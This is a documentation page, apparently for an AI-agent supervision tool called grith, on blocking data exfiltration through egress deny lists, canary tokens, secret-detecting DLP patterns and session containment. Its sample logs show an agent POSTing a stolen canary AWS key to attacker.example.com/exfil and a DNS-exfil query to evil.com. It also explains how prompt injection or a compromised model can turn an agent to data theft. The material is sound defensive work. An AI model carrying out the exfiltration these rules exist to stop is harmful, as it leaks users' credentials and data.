@@ -1,0 +1,297 @@
+---
+title: "Exfiltration Containment"
+description: "How grith prevents data exfiltration through egress controls, canary tokens, DLP, and containment mode"
+section: "guides"
+order: 6
+tier: "community"
+lastUpdated: "2026-02-24"
+---
+
+## Overview
+
+Data exfiltration is the most serious risk in AI agent execution. An agent that reads sensitive files and then makes outbound network calls has the ingredients for data theft — whether through a compromised model, prompt injection, or malicious tool.
+
+grith addresses this with multiple independent layers: egress policy filters, canary token detection, a DLP gate, destination reputation scoring, protocol-aware network controls, and a containment mode that activates after sensitive data is read.
+
+## The exfiltration kill chain
+
+A successful exfiltration requires a sequence of actions. grith intercepts at every stage:
+
+| Step | Agent action | grith response |
+|---|---|---|
+| 1. Reconnaissance | Read directory listings, search for files | Logged, scored by `path_match` and `sensitive_path` |
+| 2. Access | Read sensitive files (keys, env vars, credentials) | `secret_scan` fires, `taint` tracking begins |
+| 3. Stage | Encode or embed data in outbound payload | `dlp_gate` inspects outbound content |
+| 4. Exfiltrate | Send data via HTTP, DNS, SMTP, or other protocol | `egress_policy` blocks, `canary` fires if canary detected |
+
+Each layer is independent. Even if one filter misses, the next catches the attempt.
+
+## Egress policy filter
+
+The `egress_policy` filter controls all outbound network connections. It evaluates every network syscall before the connection is established.
+
+<ConfigExample
+  title="~/.config/grith/config.toml"
+  code={`[proxy.filters.egress_policy]
+enabled = true
+weight = 1.5
+
+# Explicitly allowed destinations
+allowed_destinations = [
+    "api.openai.com",
+    "api.anthropic.com",
+    "registry.npmjs.org",
+    "github.com",
+]
+
+# Explicitly denied destinations
+denied_destinations = [
+    "*.pastebin.com",
+    "*.ngrok.io",
+    "*.requestbin.com",
+]
+
+# What to do with destinations not in either list
+# "score" = run through remaining filters, "deny" = block immediately
+default_action = "score"`}
+/>
+
+### How scoring works
+
+| Destination | Score effect |
+|---|---|
+| In `allowed_destinations` | Score reduced by -1.0 |
+| In `denied_destinations` | Hard DENY (immediate block) |
+| Unknown destination | Scored by reputation and other filters |
+
+## Canary token detection
+
+Canary tokens are fake secrets planted in your filesystem. If an agent reads a file containing a canary token and then attempts to send it outbound, grith detects the canary in the outbound payload and immediately blocks the request with a hard DENY.
+
+### Adding canary tokens
+
+<Terminal command='grith canary add --label "aws-creds-trap" --path ~/.aws/credentials' />
+
+<CodeBlock
+  code={`[grith] ✓ Canary token created
+[grith] Label:   aws-creds-trap
+[grith] ID:      c1a2b3d4
+[grith] Token:   AKIAIOSFODNN7GRITH01 (fake AWS access key)
+[grith] Placed:  ~/.aws/credentials (appended as commented entry)`}
+  language="text"
+/>
+
+grith generates a realistic-looking but fake credential and places it in the specified file. The token value is registered in grith's canary database.
+
+### Managing canary tokens
+
+List all registered canaries:
+
+<Terminal command="grith canary list" />
+
+<CodeBlock
+  code={`Canary tokens:
+
+  ID        Label             Path                    Created
+  c1a2b3d4  aws-creds-trap    ~/.aws/credentials      2026-02-20
+  e5f6a7b8  env-trap          ~/project/.env           2026-02-21
+  i9j0k1l2  ssh-key-trap      ~/.ssh/id_ed25519.pub   2026-02-22`}
+  language="text"
+/>
+
+Rotate a canary (replace the token value, keep the label and path):
+
+<Terminal command="grith canary rotate c1a2b3d4" />
+
+Remove a canary:
+
+<Terminal command="grith canary remove c1a2b3d4" />
+
+### What happens when a canary fires
+
+When the `canary` filter detects a registered canary token in an outbound request, the result is a hard DENY with maximum severity:
+
+<CodeBlock
+  code={`[proxy] Tool call: net.connect → POST https://attacker.example.com/exfil
+  ├─ egress_policy        +3.0  (unknown destination)
+  ├─ canary               DENY  (canary token c1a2b3d4 detected in payload)
+  └─ HARD DENY — canary token exfiltration attempt
+
+[grith] INCIDENT: Canary token "aws-creds-trap" detected in outbound request.
+[grith] Source file: ~/.aws/credentials (read at 14:32:01)
+[grith] Destination: https://attacker.example.com/exfil
+[grith] Session frozen. Review with: grith digest review`}
+  language="text"
+/>
+
+The canary filter correlates the source (which file was read) with the sink (where the data was going) and logs this as a security incident with full evidence.
+
+## DLP gate
+
+The `dlp_gate` filter inspects outbound payloads for sensitive data patterns regardless of canary tokens. It detects:
+
+- AWS access keys and secret keys
+- Private keys (RSA, EC, Ed25519)
+- API tokens (common patterns for major providers)
+- Database connection strings
+- PII patterns (SSN, credit card numbers, email addresses)
+- High-entropy strings that may be secrets
+
+<ConfigExample
+  title="~/.config/grith/config.toml"
+  code={`[proxy.filters.dlp_gate]
+enabled = true
+weight = 2.0
+
+# Action on detection: "score" or "deny"
+action = "deny"
+
+# Custom patterns (regex)
+extra_patterns = [
+    "INTERNAL-[A-Z0-9]{16}",     # Internal API key format
+    "mongodb\\+srv://[^\\s]+",    # MongoDB connection strings
+]`}
+/>
+
+## Destination reputation
+
+The `reputation` filter scores outbound destinations based on known reputation data. This catches exfiltration attempts to newly registered domains, known malicious infrastructure, and suspicious hosting providers.
+
+<ConfigExample
+  title="~/.config/grith/config.toml"
+  code={`[proxy.filters.reputation]
+enabled = true
+weight = 1.0
+
+# Score additions based on destination characteristics
+new_domain_score = 2.0          # Domain registered < 30 days
+dynamic_dns_score = 3.0         # Dynamic DNS provider
+known_paste_site_score = 4.0    # Known paste/bin services
+tor_exit_node_score = 4.0       # Tor exit node IP`}
+/>
+
+## Protocol-aware controls
+
+grith's egress controls operate at the protocol level, not just HTTP. The supervisor intercepts all network syscalls, which means every protocol is visible:
+
+| Protocol | Detection method | Controls |
+|---|---|---|
+| HTTP/HTTPS | Full request inspection (URL, headers, body) | Destination allow/deny, DLP on payload |
+| DNS | Query interception | Block DNS exfiltration (long subdomain encoding) |
+| FTP/SFTP | Connection interception | Destination allow/deny, credential detection |
+| SMTP | Connection and payload inspection | Block email-based exfiltration |
+| WebSocket | Upgrade detection + frame inspection | Destination allow/deny, DLP on messages |
+| Shell transport (ssh, netcat) | Process exec + network correlation | Detect piped data to remote hosts |
+
+### DNS exfiltration detection
+
+DNS exfiltration encodes stolen data in DNS queries (e.g., `base64data.attacker.com`). grith detects this by monitoring for:
+
+- Unusually long subdomain labels
+- High query rates to a single domain
+- Queries to known dynamic DNS providers
+
+<ConfigExample
+  title="~/.config/grith/config.toml"
+  code={`[proxy.filters.egress_rate]
+enabled = true
+dns_query_rate_limit = 10        # Max DNS queries per second
+dns_subdomain_max_length = 63    # Flag subdomains longer than this`}
+/>
+
+## Containment mode
+
+The `session_containment` filter implements a key principle: after an agent reads sensitive data, its outbound network access is restricted until the session ends or a human explicitly approves further network operations.
+
+### How containment works
+
+1. Agent reads a file flagged by `secret_scan` or `sensitive_path` (e.g., `.env`, `~/.ssh/id_ed25519`)
+2. The `taint` filter marks the session as "tainted" with the sensitivity level of the data read
+3. The `session_containment` filter activates, adding a score penalty to all subsequent outbound network calls
+4. If the penalty pushes the aggregate score above the deny threshold, the network call is blocked
+5. If the score lands in the queue zone, the network call is held for human review
+
+<ConfigExample
+  title="~/.config/grith/config.toml"
+  code={`[proxy.filters.session_containment]
+enabled = true
+weight = 1.0
+
+# Score penalty applied to outbound calls after sensitive reads
+containment_score = 4.0
+
+# How long containment persists (per session)
+# "session" = until session ends, "timed" = for a fixed duration
+mode = "session"
+timed_duration = "30m"    # Only used if mode = "timed"`}
+/>
+
+### Containment in practice
+
+<CodeBlock
+  code={`[proxy] Tool call: fs.read → .env
+  ├─ sensitive_path       +2.0
+  ├─ secret_scan          +3.0  (API key detected)
+  └─ aggregate score       5.0 → QUEUE
+
+[grith] Session tainted: secret material read from .env
+[grith] Containment mode active for this session.
+
+[proxy] Tool call: net.connect → POST https://api.example.com/webhook
+  ├─ egress_policy        +0.0  (allowed destination)
+  ├─ session_containment  +4.0  (tainted session)
+  ├─ dlp_gate             +0.0  (no secrets in payload)
+  └─ aggregate score       4.0 → QUEUE
+
+[grith] Outbound call queued: session is in containment mode.
+[grith] Review with: grith digest review`}
+  language="text"
+/>
+
+The agent read `.env` (which contained an API key), so the session entered containment. The subsequent network call to `api.example.com` was queued for review even though it went to an allowed destination — because the session was tainted.
+
+## Monitoring exfiltration attempts
+
+Use `grith audit` with exfiltration-specific filters to review containment events and blocked exfil attempts:
+
+<Terminal command="grith audit --filter exfil" />
+
+<CodeBlock
+  code={`Exfiltration events (last 7 days):
+
+  Time                 Type              Target                    Decision
+  2026-02-24 14:32    canary-fire       attacker.example.com      DENY
+  2026-02-23 09:15    containment       api.slack.com             QUEUED → approved
+  2026-02-22 16:41    dlp-detect        webhook.site              DENY
+  2026-02-22 16:40    dns-exfil         long-subdomain.evil.com   DENY`}
+  language="text"
+/>
+
+For aggregate statistics:
+
+<Terminal command="grith audit export --exfil-stats" />
+
+<CodeBlock
+  code={`Exfiltration containment statistics (last 30 days):
+
+  Total outbound calls:      1,247
+  Containment activations:   23
+  Canary fires:              1
+  DLP blocks:                4
+  DNS exfil blocks:          2
+  Egress policy blocks:      31
+
+  Top blocked destinations:
+    pastebin.com             12
+    webhook.site             8
+    requestbin.com           6
+    ngrok.io                 5`}
+  language="text"
+/>
+
+## Next steps
+
+- [Filter Reference](/docs/reference/filters) — Full filter documentation including egress_policy, canary, dlp_gate, and session_containment
+- [Threat Model](/docs/security/threat-model) — grith's threat model and security architecture
+- [Filter Tuning](/docs/guides/filter-tuning) — Adjust filter weights for your risk profile
+- [Supervisor Profiles](/docs/guides/supervisor-profiles) — Network policies per supervised tool
